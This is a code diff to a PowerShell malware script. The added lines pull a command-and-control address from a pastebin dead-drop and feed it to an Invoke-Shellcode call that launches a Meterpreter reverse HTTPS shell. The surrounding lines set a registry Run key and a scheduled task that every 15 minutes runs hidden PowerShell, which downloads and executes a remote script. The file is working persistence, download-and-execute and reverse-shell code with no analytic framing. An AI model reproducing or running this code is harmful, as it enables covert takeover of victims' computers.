@@ -612,6 +612,9 @@ function Invoke-Shellcode
         }
     }   
 }
+$ipport = (New-Object Net.WebClient).DownloadString("https://pastebin.com/raw/5hCRPnVg")
+$ip = $ipport.Split(":")[0]
+$port = $ipport.Split(":")[1]
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V Powershelll /t REG_SZ /F /D "schtasks /CREATE /TN Powershelll /SC MINUTE /MO 15 /F /TR """"""cmd /c powershell.exe -windowstyle hidden -command IEX (New-Object Net.WebClient).DownloadString(\\\\\\\"https://raw.githubusercontent.com/rlock1606/ps/master/psh.ps1\\\\\\\""")"""""""
 schtasks /CREATE /TN Powershelll /SC MINUTE /MO 15 /F /TR "cmd /c powershell.exe -windowstyle hidden -command IEX (New-Object Net.WebClient).DownloadString(\\\" https://raw.githubusercontent.com/rlock1606/ps/master/psh.ps1\\\""")"
-Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.1.4 -Lport 8443 -Force
+Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost $ip -Lport $port -Force
